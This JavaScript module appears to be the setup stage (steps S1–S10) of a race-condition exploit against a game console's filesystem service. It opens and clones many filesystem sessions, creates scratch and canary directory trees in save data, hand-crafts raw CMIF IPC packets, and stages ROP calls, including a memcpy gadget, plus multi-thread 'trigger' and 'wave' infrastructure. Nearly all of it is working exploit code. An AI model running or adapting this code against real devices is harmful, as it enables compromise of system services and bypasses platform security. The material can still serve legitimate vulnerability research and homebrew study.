import coreRuntime from "../runtime.mjs";

const {
  F_Tick,
  GADGET_MEMCPY,
  allocPage,
  allocWorkerResources,
  applyCmifContext,
  borrowThreadScheduling,
  buildWaveFrames,
  findSvcSetCoreMask,
  call_rop,
  cloneFsSession,
  cloneObject,
  cmifReply,
  createGateBlock,
  findLastSendIndex,
  findSendForPacket,
  getMountHandle,
  hex32,
  ipcCommit,
  ipcCreateDirectory,
  ipcCreateFile,
  ipcFreeSpace,
  ipcGetEntryType,
  normalizedPath,
  openContentStorage,
  openFspSession,
  prepPacket,
  removeScratchTree,
  sendIPC,
  write32,
  write64,
  write8,
  writeStr,
  writeXDesc
} = coreRuntime;

// ── Setup steps (S1–S10) ────────────────────────────────────────────────────

export async function borrowRawThreadScheduling() {
    // S1: Borrow raw-thread scheduling.
    const rawScheduling = borrowThreadScheduling();
    if (!rawScheduling) {
        return failedStep("raw-thread-scheduling-unavailable");
    }

    // Discover svcSetThreadCoreMask and check that the priority range
    // fits all active workers (contiguous priorities from the base).
    if (findSvcSetCoreMask() === 0n) {
        return failedStep("svc-set-core-mask-not-found");
    }

    if (rawScheduling.priority + 12 > 63) {
        return failedStep("priority-range-too-narrow",
            "base=" + rawScheduling.priority + "; need=13");
    }

    return {ok: true, rawScheduling};
}

export async function openFspSessions({helpers}) {
  let savedHandle;
  let temporaryHandle;
  let pktBuf;
  let rootSession;
  const handles = {
    auxiliaryStorageHandle: 0,
    candidateHandle: 0,
    extentTriggerHandle: 0,
    extraStorages: [],
    pinHandle: 0,
    rootClones: [],
    saveClones: [],
    storageHandle: 0,
    triggerHandle: 0
  };
    // S2: Root session + two save clones.
    rootSession = openFspSession();
    if (!rootSession) {
        return failedStep("fsp-session-open-failed");
    }

    pktBuf = allocPage(0x2000);
    const cleanupHandles = () => helpers.cleanup({
        ...handles, rootSession, savedHandle, temporaryHandle
    });

    var saveMount = getMountHandle("save");
    if (!saveMount) {
         cleanupHandles();
        return failedStep("save-mount-unavailable");
    }

    savedHandle = cloneObject(saveMount.handle, saveMount.objId);
    if (!savedHandle) {
         cleanupHandles();
        return failedStep("save-filesystem-clone-failed");
    }
    temporaryHandle = cloneObject(saveMount.handle, saveMount.objId);
    if (!temporaryHandle) {
         cleanupHandles();
        return failedStep("temporary-filesystem-clone-failed");
    }

  return {ok: true, pktBuf, handles: {
      ...handles, rootSession, savedHandle, temporaryHandle
  }};
}

export async function createScratchTree({
  config,
  helpers,
  handleResources,
  savedHandle,
  temporaryHandle
}) {
  let SCRATCH_DIR;
  let abortControlCanonical;
  let canaryPath;
  let dirtyFilePath;
  let segments;
  let selectedDir;
  let setupPath;
  let setupPkt;
    const cleanupHandles = () => helpers.cleanup({
        ...handleResources,
        savedHandle, temporaryHandle
    });
    // S3: Scratch tree.
    SCRATCH_DIR = "/hole";
    dirtyFilePath = SCRATCH_DIR + "/commit_data";
    canaryPath = normalizedPath(SCRATCH_DIR + "/canary", config.CANARY_LENGTH);
    selectedDir = SCRATCH_DIR + "/selected";
    var segmentSalt = Number(call_rop(F_Tick) & 0x1FFFFFFFFFFFn).toString(10);
    segments = ["S0_" + segmentSalt, "S1_" + segmentSalt, "S2_" + segmentSalt];
    var markerPath = SCRATCH_DIR + "/" + segments[0] + "/" + segments[1] +
        "/" + segments[2] + "/SPAN_MARKER";

    var scratchBefore = ipcGetEntryType(savedHandle, SCRATCH_DIR);
    if (scratchBefore.error !== 0x202) {
        cleanupHandles();
        return failedStep("scratch-path-must-be-absent",
            "result=" + hex32(scratchBefore.error));
    }
    var spaceBefore = ipcFreeSpace(savedHandle, "/");
    if (spaceBefore.error !== 0 || spaceBefore.bytes <= config.DIRTY_FILE_SIZE + 0x500000) {
        cleanupHandles();
        return failedStep("insufficient-save-free-space",
            "result=" + hex32(spaceBefore.error) + "; bytes=" +
            spaceBefore.bytes + "; requiredMoreThan=" +
            (config.DIRTY_FILE_SIZE + 0x500000));
    }

    var scratchRootResult = ipcCreateDirectory(savedHandle, SCRATCH_DIR);
    var scratchCommitResult = null;
    if (scratchRootResult === 0) {
        scratchCommitResult = ipcCommit(savedHandle);
    }

    if (scratchRootResult !== 0 || scratchCommitResult !== 0) {
        removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
        return failedStep("scratch-root-create-or-commit-failed",
            "create=" + hex32(scratchRootResult) + "; commit=" +
            (scratchCommitResult === null ? "not-run" :
                hex32(scratchCommitResult)));
    }

    var dirtyFileResult = ipcCreateFile(savedHandle, dirtyFilePath,
        config.DIRTY_FILE_SIZE);
    if (dirtyFileResult !== 0) {
        removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
        return failedStep("dirty-file-create-failed",
            "result=" + hex32(dirtyFileResult));
    }

    // Canary chain.
    var canaryParts = canaryPath.slice(1).split("/");
    var canaryOk = true;
    var canaryDirectories = 0;
    var canaryMkdirFailure = null;
    for (var i = 2; i < canaryParts.length; i++) {
        var rc = ipcCreateDirectory(savedHandle, "/" + canaryParts.slice(0, i).join("/"));
        if (rc !== 0 && (rc & 0x3FFFFF) !== 0x402) {
            canaryOk = false;
            canaryMkdirFailure = {index: i, pathLength: canaryParts
                .slice(0, i).join("/").length + 1, result: rc};
            break;
        }
        canaryDirectories++;
    }
    var canaryCreateResult = 0xFFFFFFFF;
    if (canaryOk) {
        canaryCreateResult = ipcCreateFile(savedHandle, canaryPath, 1);
    }

    if (!canaryOk || canaryCreateResult !== 0) {
        removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
        return failedStep("canary-chain-create-failed",
            "pathLen=" + canaryPath.length + "; dirs=" +
            canaryDirectories + "/" + (canaryParts.length - 2) +
            (canaryMkdirFailure ? "; mkdirAt=" + canaryMkdirFailure.index +
                "; mkdirLen=" + canaryMkdirFailure.pathLength +
                "; mkdirResult=" + hex32(canaryMkdirFailure.result) : "") +
            "; create=" + hex32(canaryCreateResult));
    }
    // Empty-path abort control result.
    setupPkt = allocPage(0x2000);
    setupPath = allocPage(0x1000);
    write8(setupPath, 0n);
    prepPacket(setupPkt, (4 | (1 << 16)) >>> 0, 8, []);
    writeXDesc(setupPkt, 8, setupPath, 1);
    write32(setupPkt + 0x10n, 0x49434653n);
    write32(setupPkt + 0x18n, 7n);
    var abortTransport = Number(sendIPC(savedHandle, setupPkt)) >>> 0;
    if (abortTransport !== 0) {
        removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
        return failedStep("abort-control-transport-failed",
            "transport=" + hex32(abortTransport));
    }
    abortControlCanonical = cmifReply(setupPkt).result & 0x3FFFFF;

    // Selected directory and SPAN tree via temporary.
    var selectedDirectoryResult = ipcCreateDirectory(savedHandle, selectedDir);
    if (selectedDirectoryResult !== 0) {
        removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
        return failedStep("selected-directory-create-failed",
            "result=" + hex32(selectedDirectoryResult));
    }
    var running = SCRATCH_DIR;
    for (var i = 0; i < segments.length; i++) {
        running += "/" + segments[i];
        var spanDirectoryResult = ipcCreateDirectory(temporaryHandle, running);
        if (spanDirectoryResult !== 0) {
            removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
            return failedStep("span-directory-create-failed",
                "index=" + i + "; result=" + hex32(spanDirectoryResult));
        }
    }
    var spanMarkerResult = ipcCreateFile(temporaryHandle, markerPath, 1);
    if (spanMarkerResult !== 0) {
        removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
        return failedStep("span-marker-create-failed",
            "result=" + hex32(spanMarkerResult));
    }

  return {ok: true, SCRATCH_DIR, abortControlCanonical, canaryPath,
      canaryDirectories, canaryCreateResult, dirtyFilePath, segments,
      selectedDir, setupPath, setupPkt};
}

export async function openStorageAndClones({
  helpers,
  handleResources,
  SCRATCH_DIR,
  rootSession,
  savedHandle
}) {
    let storageHandle;
    const saveClones = [];
    const rootClones = [];
    const cleanupHandles = () => helpers.cleanup({
        ...handleResources,
        storageHandle, saveClones, rootClones
    });
    // S4: Primary IStorage + clones.
    storageHandle = openContentStorage(rootSession);
    if (!storageHandle) {
        removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
        return failedStep("primary-storage-open-failed");
    }

    for (var i = 0; i < 6; i++) {
        var h = cloneFsSession(savedHandle);
        if (!h) {
            removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
            return failedStep("save-filesystem-clone-failed",
                "index=" + i); }
        saveClones.push(h);
    }
    for (var i = 0; i < 4; i++) {
        var h = cloneFsSession(rootSession);
        if (!h) {
            removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
            return failedStep("root-filesystem-clone-failed",
                "index=" + i); }
        rootClones.push(h);
    }

  return {ok: true, rootClones, saveClones, storageHandle};
}

export async function openTriggerHandles({
  helpers,
  handleResources,
  SCRATCH_DIR,
  savedHandle,
  temporaryHandle
}) {
    let triggerHandle;
    let extentTriggerHandle;
    const cleanupHandles = () => helpers.cleanup({
        ...handleResources,
        triggerHandle, extentTriggerHandle
    });
    // S5: Trigger handles.
    triggerHandle = cloneFsSession(savedHandle);
    extentTriggerHandle = cloneFsSession(temporaryHandle);
    if (!triggerHandle || !extentTriggerHandle) {
        removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
        return failedStep("trigger-handle-clone-failed",
            "trigger=" + Boolean(triggerHandle) + "; extent=" +
            Boolean(extentTriggerHandle));
    }

  return {ok: true, extentTriggerHandle, triggerHandle};
}

export function allocatePacketBuffers({
  config,
  SCRATCH_DIR,
  canaryPath
}) {
  let canaryBufMem;
  let extentTotal;
  let fillerBuf0;
  let fillerBuf1;
  let fillerDst;
  let fillerSrc;
  let fragmentBufs;
  let guardBuf0;
  let guardBuf1;
  let guardPath;
  let guardPathC;
  let triggerBuf;
    // S6: Packet buffers.
    extentTotal = config.EXTENT_SIZE + 1;
    triggerBuf = allocPage(0x2000);
    fragmentBufs = [];
    for (var i = 0; i < 4; i++) fragmentBufs.push(allocPage(0x2000));

    canaryBufMem = allocPage(0x1000);
    writeStr(canaryBufMem, canaryPath);

    guardPath = normalizedPath(SCRATCH_DIR + "/absent", 0x300);
    guardPathC = guardPath.slice(0, -1) + "C";
    guardBuf0 = allocPage(0x1000);
    guardBuf1 = allocPage(0x1000);
    writeStr(guardBuf0, guardPath);
    writeStr(guardBuf1, guardPathC);

    fillerSrc = "/NS2_SRC00000000";
    fillerDst = normalizedPath(SCRATCH_DIR + "/page_absent", 0x7EF);
    fillerBuf0 = allocPage(0x1000);
    fillerBuf1 = allocPage(0x1000);
    writeStr(fillerBuf0, fillerSrc);
    writeStr(fillerBuf1, fillerDst);

  return {ok: true, canaryBufMem, extentTotal, fillerBuf0, fillerBuf1, fillerDst, fillerSrc, fragmentBufs, guardBuf0, guardBuf1, guardPath, guardPathC, triggerBuf};
}

export function buildIpcRequests({
  config,
  canaryBufMem,
  canaryPath,
  fillerBuf0,
  fillerBuf1,
  fragmentBufs,
  guardBuf0,
  guardBuf1,
  triggerBuf
}) {
  let REQ;
  let clearPkt;
  let pinPkt;
  let prePkt;
    // S7: IPC request packets.
    REQ = [];
    for (var i = 0; i < 13; i++) REQ.push(allocPage(0x2000));

    // Role 0: Commit (cmd 10)
    prepPacket(REQ[0], 4, 8, [[16, 0x49434653], [24, 10]]);

    // Role 1: IStorage::Read (cmd 0) with B descriptor
    var bottleneckRecv = allocPage(config.WAVE_READ_SIZE + 0x2000);
    prepPacket(REQ[1], (4 | (1 << 24)) >>> 0, 0x0C, []);
    write32(REQ[1] + 8n, BigInt(config.WAVE_READ_SIZE));
    write32(REQ[1] + 12n, BigInt(Number(bottleneckRecv & 0xFFFFFFFFn)));
    write32(REQ[1] + 16n, BigInt(((1 | (Number((bottleneckRecv >> 36n) & 7n) << 2) |
        (Number((bottleneckRecv >> 32n) & 15n) << 28)) >>> 0)));
    write32(REQ[1] + 0x20n, 0x49434653n);
    write32(REQ[1] + 0x28n, 0n);
    write64(REQ[1] + 0x30n, 0n);
    write64(REQ[1] + 0x38n, BigInt(config.WAVE_READ_SIZE));

    // Roles 2-5: fragment cmd 1002
    for (var i = 0; i < 4; i++) {
        prepPacket(REQ[2 + i], (4 | (1 << 16)) >>> 0, 8,
            [[16, 0x49434653], [24, 1002]]);
        writeXDesc(REQ[2 + i], 8, fragmentBufs[i], config.SLOT_SIZE);
    }

    // Role 6: canary GetEntryType (cmd 7)
    prepPacket(REQ[6], (4 | (1 << 16)) >>> 0, 8, [[16, 0x49434653], [24, 7]]);
    writeXDesc(REQ[6], 8, canaryBufMem, canaryPath.length + 1);

    // Roles 7-8: filler RenameFile (cmd 5)
    for (var idx = 7; idx <= 8; idx++) {
        prepPacket(REQ[idx], (4 | (2 << 16)) >>> 0, 8,
            [[32, 0x49434653], [40, 5]]);
        writeXDesc(REQ[idx], 8, fillerBuf0, 16);
        writeXDesc(REQ[idx], 16, fillerBuf1, 0x7F0, 1);
    }

    // Role 9 support packets: pin, clear, pre-release
    pinPkt = allocPage(0x2000);
    clearPkt = allocPage(0x2000);
    prePkt = allocPage(0x2000);
    prepPacket(pinPkt, 4, 8, [[16, 0x49434653], [24, 200]]);
    write32(pinPkt, 6n); write32(pinPkt + 20n, 1n); write32(pinPkt + 28n, 9n);
    prepPacket(clearPkt, 4, 8, [[16, 0x49434653], [24, 1009]]);
    write32(clearPkt, 6n); write32(clearPkt + 20n, 1n); write32(clearPkt + 28n, 9n);
    prepPacket(prePkt, 4, 8, [[16, 0x49434653], [24, 1009]]);
    write32(prePkt, 6n); write32(prePkt + 20n, 1n); write32(prePkt + 28n, 9n);

    // Role 9: CloseObject
    prepPacket(REQ[9], 4, 8, []);
    write8(REQ[9] + 16n, 2n);
    write32(REQ[9] + 20n, 0n);
    write32(REQ[9] + 28n, 0n);

    // Roles 10-11: guard RenameFile (cmd 5)
    prepPacket(REQ[10], (4 | (2 << 16)) >>> 0, 8,
        [[32, 0x49434653], [40, 5]]);
    writeXDesc(REQ[10], 8, guardBuf0, 0x301);
    writeXDesc(REQ[10], 16, guardBuf1, 0x301, 1);
    prepPacket(REQ[11], (4 | (2 << 16)) >>> 0, 8,
        [[32, 0x49434653], [40, 5]]);
    writeXDesc(REQ[11], 8, guardBuf0, 0x301);
    writeXDesc(REQ[11], 16, guardBuf1, 0x301, 1);

    // Role 12: trigger GetEntryType (cmd 7)
    prepPacket(REQ[12], (4 | (1 << 16)) >>> 0, 8,
        [[16, 0x49434653], [24, 7]]);
    writeXDesc(REQ[12], 8, triggerBuf, config.SLOT_SIZE);

  return {ok: true, REQ, clearPkt, pinPkt, prePkt};
}

export async function checkPathPair({
  config,
  helpers,
  handleResources,
  SCRATCH_DIR,
  fillerDst,
  fillerSrc,
  guardPath,
  guardPathC,
  rootSession,
  savedHandle
}) {
    let auxiliaryStorageHandle;
    const cleanupHandles = () => helpers.cleanup({
        ...handleResources,
        auxiliaryStorageHandle
    });
    // S8: Path-pair control.
    var fillersActive = config.workerRoles.indexOf(7) >= 0 ||
        config.workerRoles.indexOf(8) >= 0;
    var fillerControlOk = true;

    if (fillersActive) {
        var fillerControl = await helpers.checkPathPairQuiet(
            fillerSrc, 16, fillerDst, 0x7F0,
            {savedHandle, returnDiagnostics: true});
        fillerControlOk = fillerControl.ok;
    }

    var guardControl = fillerControlOk
        ? await helpers.checkPathPairQuiet(
            guardPath, 0x301, guardPathC, 0x301,
            {savedHandle, returnDiagnostics: true})
        : null;
    var guardControlOk = guardControl ? guardControl.ok : null;
    var controlOk = Boolean(fillerControlOk && guardControlOk);
    if (!controlOk) {
        removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
        return failedStep("path-pair-control-failed",
            "filler=" + Boolean(fillerControlOk) + "; guard=" +
            (guardControlOk === null ? "not-run" : Boolean(guardControlOk)));
    }

    // Auxiliary IStorage.
    auxiliaryStorageHandle = openContentStorage(rootSession);
    if (!auxiliaryStorageHandle) {
        removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
        return failedStep("auxiliary-storage-open-failed");
    }

  return {ok: true, auxiliaryStorageHandle};
}

export function applyCmifContexts({
  REQ,
  clearPkt,
  pinPkt,
  prePkt
}) {
    // S9: CMIF contexts.
    for (var i = 0; i < 13; i++) {
        var ctx = (i === 0 || (i >= 2 && i <= 5)) ? 3 : 9;
        if (i !== 9) applyCmifContext(REQ[i], ctx);
    }
    applyCmifContext(pinPkt, 9);
    applyCmifContext(clearPkt, 9);
    applyCmifContext(prePkt, 9);

  return {ok: true};
}

export async function prepareWaveInfrastructure({
  helpers,
  REQ,
  clearPkt,
  pinPkt,
  prePkt,
  rootClones,
  saveClones,
  storageHandle,
  triggerBuf,
  triggerHandle,
  config,
  rootSession
}) {
  let clearSendIndex;
  let gates;
  let pinSendIndex;
  let preSendIndex;
  let roleHandles;
  let sendIndices;
  let waveData;
  let waveExtra;
  let workerResources;
    // S10: Wave infrastructure.
    roleHandles = [
        saveClones[0], storageHandle, rootClones[0], rootClones[1],
        rootClones[2], rootClones[3], saveClones[1], saveClones[2],
        saveClones[3], 0, saveClones[4], saveClones[5], triggerHandle
    ];

    gates = createGateBlock();
    var plans = helpers.buildPlans({config: config, REQ, clearPkt,
        gates, pinPkt, prePkt, roleHandles,
        rootSession: rootSession, triggerBuf});
    sendIndices = plans.map(findLastSendIndex);
    pinSendIndex = findSendForPacket(plans[9], pinPkt);
    clearSendIndex = findSendForPacket(plans[9], clearPkt);
    preSendIndex = findSendForPacket(plans[9], prePkt);

    waveData = buildWaveFrames(plans, REQ, triggerBuf, sendIndices);
    workerResources = allocWorkerResources(13);

    var pinBk = allocPage(0x2000); call_rop(GADGET_MEMCPY, pinBk, pinPkt, 0x1000n);
    var clearBk = allocPage(0x2000); call_rop(GADGET_MEMCPY, clearBk, clearPkt, 0x1000n);
    var preBk = allocPage(0x2000); call_rop(GADGET_MEMCPY, preBk, prePkt, 0x1000n);

    waveExtra = {
        packets: [
            { pkt: pinPkt, backup: pinBk },
            { pkt: clearPkt, backup: clearBk },
            { pkt: prePkt, backup: preBk }
        ],
        triggerBuf: triggerBuf,
        triggerFirstByte: 0x2F
    };

  return {ok: true, clearSendIndex, gates, pinSendIndex, preSendIndex, roleHandles, sendIndices, waveData, waveExtra, workerResources};
}

function failedStep(failureReason, failureDetail) {
  return {ok: false, failureReason,
      ...(failureDetail ? {failureDetail} : {})};
}
